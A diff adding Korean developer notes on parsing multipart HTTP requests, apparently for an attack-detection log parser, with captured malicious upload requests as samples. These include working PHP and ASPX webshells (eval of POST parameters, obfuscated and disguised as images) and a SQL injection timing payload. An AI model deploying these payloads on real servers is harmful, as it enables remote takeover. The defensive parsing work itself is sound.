@@ -1,0 +1,389 @@
+
+1.	multipart파싱할때 원래 \n\n 두개 있는걸 기준으로 index를잡았따 그런데 여기에는 \n처리가 안되어있어서
+	index를 나름대로 잡았는데 (323 ~333 라인 ) 더 개선방안이 있을까요?
+	==> 일단 추후에 발전시키기
+
+2.	Content-Disposition:form-data;name="NewFile";filename="ebd.asp  여기서 filename도 가져올까요?
+	==> ㅇㅇ 
+
+3. content-type 이랑 content-disposition 어떤 종류일때 뽑을지요? pdf나 jpg이런거 안뽑기로했는데 type만 jpg이고 실제론 공격코드가 들어가는경우가잇네요  (1985라인)
+
+4. http header에 content-type이없을떈?? (493라인)
+	--> parsepost 함수에서 content-disposition이 있을떄 multipart라고생각하고 해결함
+
+5. 1512라인 같이 ?가 아니라 ;로 데이터를 넘기면 ??   ( /form-data;boundary=----WebKitFormBoundarysyaAsOGjPO89JR63 )
+	--> parsetype1에서 처리해줌
+
+6. 32번라인은 3-1 유형 1021번 라인은 3-2유형인데 구분을 어떻게하는가
+	현재는 COOOKIE , REFERER , HOST 이런값이없으면 데이터만 다닥다닥 붙어있는경우(body부분)이 라서 3-1 유형으로 판단하는데  ( payload.vlaues()에 값이 없으면 3-1)
+	만약 POST multipartform 형식에서 221라인처럼 body에 content-type이 존재하면 어떻게 분류?
+	==>굳이 딱 안나눠도 댐
+
+7. 3-1 유형 파싱할때 application/x-www-form-urlencoded 인지  multipart/form-data 인지 알아야하는데 
+	현재는 "--" in line 으로 하여 multipart/form-data인것으로 판단하였다.
+	하지만 application/x-www-form-urlencoded데이터에서 A='or 1=1 --  이런 내용이있으면 어떻게 구분하지요 ? "--"이 겹치는데 
+	==>10번과 답 같음
+
+8. 158라인 같은건 어떻게 파싱?
+	=> 무시함 
+	
+9. 172라인은 현제 3-2유형으로 파싱되는데 패킷자체가 이상한경우는 어떻게 해야하는지요?
+	==>post데이터라생각하고 파싱 content-position이 있을경우에 post파싱함
+
+10. 1564라인은 3-2 유형이다. content-type 부분도 없어서 boundary를 정확히 구하지못해 리스트를 반환하면 다음과 같이 나옵니다. 그래서 나중에 리스트를 탐색해서 if "---" in list_element 를통해 삭제하였습니다. 
+['blaze_add_new_album --------', '--------', '--------', '<?php ...중략....';} } ?> --------']
+==> content disposition을 보는거로 해결
+
+11. file name파싱할때 \n으로 나눌지 "로 나눌지 고민 입니다 . 24번 32번 고민
+=> 무시함, 로그만남기자
+
+12. 1861 1860 고민 
+=> if "--" in token 으로 해결
+
+13. 2011 번같이 마지막에 데이터짤린건 어떻게 ?
+=> 버리자
+
+14. SQL_PARAM50 에서 이런데이터를 파싱하면 아무것도 안나온다 어떻게하지?
+getPortal'&&BeNChMaRK(2999999,mD5(NOW()))&&'1
+
+
+
+---------------1985-------------------
+POST
+/index.php?do=ajax&view=upload&file_type=big&filename=filename
+HTTP/1.1
+Cache-Control:no-cache
+Connection:Keep-Alive
+Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryTqRdMPcyLBUPeyAq
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Language:zh-cn
+User-Agent:Mozilla/5.0
+(compatible;MSIE
+10.0;Windows
+NT
+6.2)
+Content-Length:254
+Host:m.enter.etoday.co.kr
+------WebKitFormBoundaryTqRdMPcyLBUPeyAq
+Content-Disposition:form-data;name="filename";filename="1.php"
+Content-Type:jpg
+Ra<?php
+function
+s($a){
+	$b
+=
+'';	@eval($b.$a.$b);}
+@s($_POST['zs']);?>
+------WebKitFormBoundaryTqRdMPcyLBUPeyAq--
+
+
+---------------493-------------------
+/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language:zh-CN,zh;q=0.8
+Referer:http://times.hankooki.com//fckeditor/editor/filemanager/upload/aspx/upload.aspx?Type=Media
+User-Agent:Mozilla/5.0
+(Windows
+NT
+10.0;Win64;x64)
+AppleWebKit/537.36
+(KHTML,like
+Gecko)
+Chrome/55.0.2883.75
+Safari/537.36
+Origin:null
+Upgrade-Insecure-Requests:1
+Content-Length:2591
+Host:times.hankooki.com
+X-Forwarded-For:114.239.53.225
+Via:1.1
+Cache3
+(Jaguar/3.0-11)
+Connection:Keep-Alive
+------WebKitFormBoundarysyaAsOGjPO89JR63
+Content-Disposition:form-data;name="NewFile";filename="x.aspx"
+Content-Type:application/xml
+<%@
+Page
+Language="Jscript"
+validateRequest="false"
+%>
+<%
+var
+keng
+keng
+=
+Request.Item["test"];Response.Write(eval(keng,"unsafe"));%>
+<!DOCTYPE
+html
+PUBLIC
+"-//W3C//DTD
+XHTML
+1.0
+Transition0al//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><HTML><HEAD><TITLE>
+?
+?</TITLE><META
+http-equiv=Content-Type
+content="text/html;charset=gb2312"><meta
+http-equiv="pragma"
+content="no-cache"
+/><meta
+http-equiv="cache-control"
+content="no-store"
+/><meta
+http-equiv="Connection"
+content="Close"
+/><STYLE
+type=text/css>.border
+{BACKGROUND:#218dbe;PADDING-BOTTOM:3px;WIDTH:530px}.tit
+{	BACKGROUND:#fff;	MARGIN-LEFT:3px;	WIDTH:464px;	padding:10px
+0
+0
+60px;	line-height:24px;	font-size:12px;}.tit_01
+{	color:#fc4f03;	font-size:16px;	font-weight:bold;	line-height:40px;}.tit
+ul
+{	margin:0;	padding:0;	list-style-type:none;}.tit
+ul
+li
+{	padding-left:50px;}.xqck
+{	line-height:30px;}.xqck
+a
+{	color:#218dbe}.tit_bt
+{	FONT-WEIGHT:bold;	FONT-SIZE:14px;	COLOR:#fff;	TEXT-INDENT:1em;	LINE-HEIGHT:30px;	HEIGHT:30px}.tit-bottom
+{	FONT-SIZE:14px;	BACKGROUND:#e7e3e3;	MARGIN-LEF
+
+---------------1512-------------------
+/form-data;boundary=----WebKitFormBoundarysyaAsOGjPO89JR63
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language:zh-CN,zh;q=0.8
+Referer:http://enter.etoday.co.kr//fckeditor/editor/filemanager/upload/aspx/upload.aspx?Type=Media
+User-Agent:Mozilla/5.0
+(Windows
+NT
+10.0;Win64;x64)
+AppleWebKit/537.36
+(KHTML,like
+Gecko)
+Chrome/55.0.2883.75
+Safari/537.36
+Origin:null
+Upgrade-Insecure-Requests:1
+Content-Length:2591
+Host:enter.etoday.co.kr
+------WebKitFormBoundarysyaAsOGjPO89JR63
+Content-Disposition:form-data;name="NewFile";filename="x.aspx"
+Content-Type:application/xml
+<%@
+Page
+Language="Jscript"
+validateRequest="false"
+%>
+<%
+var
+keng
+keng
+=
+Request.Item["test"];Response.Write(eval(keng,"unsafe"));%>
+<!DOCTYPE
+html
+PUBLIC
+"-//W3C//DTD
+XHTML
+1.0
+Transition0al//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><HTML><HEAD><TITLE>
+?
+?</TITLE><META
+http-equiv=Content-Type
+content="text/html;charset=gb2312"><meta
+http-equiv="pragma"
+content="no-cache"
+/><meta
+http-equiv="cache-control"
+content="no-store"
+/><meta
+http-equiv="Connection"
+content="Close"
+/><STYLE
+type=text/css>.border
+{BACKGROUND:#218dbe;PADDING-BOTTOM:3px;WIDTH:530px}.tit
+{	BACKGROUND:#fff;	MARGIN-LEFT:3px;	WIDTH:464px;	padding:10px
+0
+0
+60px;	line-height:24px;	font-size:12px;}.tit_01
+{	color:#fc4f03;	font-size:16px;	font-weight:bold;	line-height:40px;}.tit
+ul
+{	margin:0;	padding:0;	list-style-type:none;}.tit
+ul
+li
+{	padding-left:50px;}.xqck
+{	line-height:30px;}.xqck
+a
+{	color:#218dbe}.tit_bt
+{	FONT-WEIGHT:bold;	FONT-SIZE:14px;	COLOR:#fff;	TEXT-INDENT:1em;	LINE-HEIGHT:30px;	HEIGHT:30px}.tit-bottom
+{	FONT-SIZE:14px;	BACKGROUND:#e7e3e3;	MARGIN-LE
+
+
+
+---------------32-------------------
+------------ei4cH2KM7cH2ae0KM7ei4GI3Ij5ei4
+Content-Disposition:form-data;name="Filedata";filename="(2).hwp" Content-Type:application/octet-stream
+????
+
+---------------221------------------	DataType : 31
+--xYzZY
+Content-Disposition:form-data;name="file";filename="ddd.php"
+Content-Type:application/octet-stream
+????
+
+
+---------------1021-------------------
+b34304ca
+Accept:text/html,application/xhtml+xml,*/*
+Accept-Language:zh-CN
+Referer:http://luminary.valofe.com/houtai/Admincenter/Uploads.upload.allowpath.1.allowext.gif%7Cphp%7Cjpeg%7Cpng%7Cbmp.do?dir=image
+User-Agent:Mozilla/5.0
+(compatible;MSIE
+9.0;Windows
+NT
+6.1;WOW64;Trident/5.0)
+Content-Length:2403
+Host:luminary.valofe.com
+-----------------------------7e310b34304ca
+Content-Disposition:form-data;name="localUrl"
+C:\Users\Administrator\Downloads\phpwebshell\shell.php
+-----------------------------7e310b34304ca
+Content-Disposition:form-data;name="imgFile";filename="C:\Users\Administrator\Downloads\phpwebshell\shell.php"
+Content-Type:application/octet-stream
+<?php
+$password='admin';//Ôô?ÚË?
+//Üâó­ÌÚãæ£º???ûù¡¢???ûù¡¢Ù¤Öµ?ûù¡¢Úã??ûù¡¢ÙþËìÎ·×â?ûù¡¢?????ûùÔõÓÞÕáÍíÒö???ûù¡£
+//ÍíÒö÷åßä£ºPHPÍÔ÷úÜâî¸÷úÜâÔ´Òö?ú¼£¬ÙþËìÓ­á³ïñùÐ£¬Û°øµß¾?£¬ÍíÒöË­ÓÞ£¬ð«?ÙéýÝîé£¬Ùé?waf£¬?äÌîïÏ·¡¢éö?¡¢360¡¢ä¹×ìéö¡¢??ãêÔõñ«×µwaf¡£ÔÒ?ò¨ò¥óøÓï¡¢xise?ïÈ¡£
+$html='$password'.'='."'".$password."';".'@e#html'.''.'v'."".''.''."".''.''.''.'a'.''.'l('.'g'.''."".''.''.'z'.'i'.''.''.'n'.'f'.'l'.''.''."".'a'.'t'.'e(b'.'as'.''.''.''."".''.'e'.'6'.''."".''."".""."".''.'4_'.'d'.'e'.'c'.''.''.''."".''."".'o'.'d'.'e'.'('."'lVZhb5tIEP0eKf9hg6ICEufgXBy1sSI1TTHJKcY5jJsmbYTwspitMUt3SWiT+r/fLLZjjN3UxxfE7sybN29nZtndIZwz7nOSMZ7TdKSZent3RxAhKEt9kQc81+QKjZC2R4Ugubbv961+/7LnfFGyOAsyqtzrOnre3UHw7GN0ilS1Pf96EIQHI5LmcrXLnmiSBAdHDRNpmE2yIKfDhLRRt39poeOG2UY3NA1ZIZDjoVbjUF/i8AQQhoEgx0d+SDALibb6pdwO4n7Xdqzh33fdrvnP460Z2uFhx3M+f6DDT9mhd5G5odn66Ny04k/N8b
+
+
+---------------158------------------	DataType : 31
+?h~XR??'/??=&*?lVu?o??Q????n?i?;MK:v???;??q???
+??y??S????OH??Z?w,ý³?
+????
+?3L?u?1??xT]???????eo?j?G?$C?Mv??Om?q?:?q??????N.??W????>?V?;e??X???W3?????M?W???lO?y?u?_N^a??6Aa?J??Z??B???X9????
+?gAF????7??&lmo?WUv7??p?9V/?U??1??a?=?????.?P:??9h,?9?n???;?????a?S?%F???|?*~??gT?????.???w???K
+???<?~??k??[U?
+?|4?q?
+?>#???3????$??=?WO?¬ã??
+
+
+---------------172------------------	DataType : 32
+=Media
+HTTP/1.1
+Connection:close
+Content-Type:multipart/form-data;boundary=---------------------------186972382420519
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language:zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Referer:http://m.etoday.kr/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media
+User-Agent:Mozilla/5.0
+(Windows
+NT
+10.0;WOW64;rv:53.0)
+Gecko/20100101
+Firefox/53.0
+Upgrade-Insecure-Requests:1
+Content-Length:240
+Host:m.etoday.kr
+-----------------------------186972382420519
+Content-Disposition:form-data;name="NewFile";filename="Hzllaga_Getshell.php"
+Content-Type:image/jpeg
+GIF89a
+<?php
+eval($_POST[haihai])
+?>
+-----------------------------186972382420519--
+
+---------------24------------------	DataType : 2
+POST
+//index.php?s=/admin/upload/uploadfile
+HTTP/1.0
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryEAqxhtdRSTobjkWC
+User-Agent:Mozilla/5.0
+(compatible;MSIE
+9.0;Windows
+NT
+6.1;Trident/5.0)
+Host:www.hankooki.com
+Content-Length:437
+X-Forwarded-For:221.2.44.75
+Via:1.1
+Cache2
+(Jaguar/3.0-11)
+Connection:Keep-Alive
+------WebKitFormBoundaryEAqxhtdRSTobjkWC
+Content-Disposition:form-data;name="file_upload";filename="rose.php
+Content-Type:application/octet-stream
+GIF89a?147841<?php
+($b4dboy
+=
+$_POST['rose'])
+&&
+@preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)','add');?>Qq147841221
+------WebKitFormBoundaryEAqxhtdRSTobjkWC
+Content-Disposition:form-data;name="file_path"
+upload/common/
+------WebKitFormBoundaryEAqxhtdRSTobjkWC--
+
+
+---------------32------------------	DataType : 32
+------------ei4cH2KM7cH2ae0KM7ei4GI3Ij5ei4
+Content-Disposition:form-data;name="Filedata";filename="º¸µµÀÚ·á
+(2).hwp"
+Content-Type:application/octet-stream
+????
+
+
+---------------2011------------------	DataType : 32
+6128
+------WebKitFormBoundaryjm0mfddrPBfyeSoE
+Content-Disposition:form-data;name="cpnyfaxno1"
+------WebKitFormBoundaryjm0mfddrPBfyeSoE
+Content-Disposition:form-data;name="cpnyfaxno2"
+------WebKitFormBoundaryjm0mfddrPBfyeSoE
+Content-Disposition:form-data;name="cpnyfaxno3"
+------WebKitFormBoundaryjm0mfddrPBfyeSoE
+Content-Disposition:form-data;name="isUpload"
+Y
+------WebKitFormBoundaryjm0mfddrPBfyeSoE
+Content-Disposition:form-data;name="fileName2"
+test123.jsp
+------WebKitFormBoundaryjm0mfddrPBfyeSoE
+Content-Disposition:form-data;name="file2";filename="test123.jsp"
+Content-Type:application/octet-stream
+<html>
+<head><title>Hello
+World</title></head>
+<body>
+Hello
+World!<br/>
+<%
+out.println("Your
+IP
+address
+is
+"
++
+request.getRemoteAddr());%>
+</body>
+</html>
+------WebKitFormBoundaryjm0mfddrPBfyeSoE
+Content-Disposition:form-data;name="isUpload"
+N
+------WebKitFormBoundaryjm0mfddrPBfyeSoE
+Content-Disposition:form-data;name="fileName3"
+test.jpg
+------WebKitFormBoundaryjm0mfddrPBfyeSoE
+Content-Disposition:form-data;name="file3"
+------WebKitFormBoundaryjm0mfddrPBfyeSoE
+Content-Disposition:form-data;name="wholesale"
+------WebKitFormBoundaryjm0mfddrPBfyeSoE
+Content-Disposition:form-data;name="isUpload"
+N
+------WebKitFor
